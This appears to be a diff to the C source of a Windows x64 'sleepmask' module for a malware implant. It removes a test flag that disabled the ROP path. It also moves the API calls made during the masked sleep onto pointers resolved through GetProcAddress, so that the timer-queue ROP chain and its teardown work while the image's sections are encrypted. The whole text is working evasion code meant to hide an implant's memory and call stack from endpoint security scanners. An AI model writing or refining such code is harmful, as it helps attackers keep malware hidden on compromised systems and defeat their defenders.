@@ -9,8 +9,6 @@
  * reason are the spoofed ones for the entire window. */
 #include "sleepmask_gen3.h"
 
-#define G3_ROP_OFF  /* stage 1a acceptance run; revert for the ROP timing round */
-
 #if defined(_M_X64)
 
 #include <windows.h>
@@ -535,14 +533,17 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 	void * (*pmemcpy)(void *, const void *, size_t);
 	G3_NTCONTINUE pcontinue;
 	void * (WINAPI *pwait)(HANDLE, DWORD);
+	void * (WINAPI *psetevent)(HANDLE);
+	BOOL (WINAPI *pdeletetq)(HANDLE, HANDLE);
+	BOOL (WINAPI *pcloseh)(HANDLE);
 	void * childsp;
 	unsigned char * rsp_at_wait;
 	BOOL ok = FALSE;
 
-#if defined(G3_ROP_OFF)
-	/* stage 1a: no timers at all - the ROP beats would stomp a plain
-	 * sleeping thread's stack (spoof at 300ms vs wake at `time`) */
-	{
+	if (time < 700) {
+		/* short window: the fixed 150/300ms beats would land out of order
+		 * against a wake at time+600 - serve it masked with a plain
+		 * pointer-resolved sleep instead */
 		void (WINAPI *psleep)(DWORD) = (void (WINAPI *)(DWORD))
 			GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
 		if (psleep == NULL)
@@ -551,13 +552,25 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 		psleep(time);
 		return TRUE;
 	}
-#else
+
 	pmemcpy = (void *(*)(void *, const void *, size_t))
 		GetProcAddress(GetModuleHandleA("ntdll.dll"), "memcpy");
 	pcontinue = (G3_NTCONTINUE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");
 	pwait = (void *(WINAPI *)(HANDLE, DWORD))
 		GetProcAddress(GetModuleHandleA("kernel32.dll"), "WaitForSingleObject");
-	if (pmemcpy == NULL || pcontinue == NULL || pwait == NULL)
+	/* the SetEvent beat fires INSIDE the masked window: (DWORD64)SetEvent
+	 * would be the address of the .text IAT thunk stub, whose jmp reads
+	 * the (ciphertext) .rdata slot at fire time - jump to garbage. Same
+	 * for the teardown below: everything between pwait returning and
+	 * gen3_sleep's unmask loop must run on pre-resolved pointers. */
+	psetevent = (void *(WINAPI *)(HANDLE))
+		GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetEvent");
+	pdeletetq = (BOOL (WINAPI *)(HANDLE, HANDLE))
+		GetProcAddress(GetModuleHandleA("kernel32.dll"), "DeleteTimerQueueEx");
+	pcloseh = (BOOL (WINAPI *)(HANDLE))
+		GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
+	if (pmemcpy == NULL || pcontinue == NULL || pwait == NULL ||
+	    psetevent == NULL || pdeletetq == NULL || pcloseh == NULL)
 		return FALSE;
 
 	queue = CreateTimerQueue();
@@ -599,7 +612,7 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 	rop_restore.R8 = g_stack_bytes;
 
 	rop_event.Rsp -= 8;
-	rop_event.Rip = (DWORD64)SetEvent;
+	rop_event.Rip = (DWORD64)psetevent; /* real kernel32 address, NOT the thunk */
 	rop_event.Rcx = (DWORD64)event;
 
 	/* arm everything with lead time for the mask pass, THEN mask, THEN
@@ -624,12 +637,13 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 	ok = TRUE;
 
 done:
+	/* still masked here (gen3_sleep unmasks after we return): every API
+	 * through the pre-resolved pointers above, never the IAT */
 	if (queue != NULL)
-		DeleteTimerQueueEx(queue, INVALID_HANDLE_VALUE);
+		pdeletetq(queue, (HANDLE)-1);
 	if (event != NULL)
-		CloseHandle(event);
+		pcloseh(event);
 	return ok;
-#endif
 }
 
 /* ---------------- entry ---------------- */
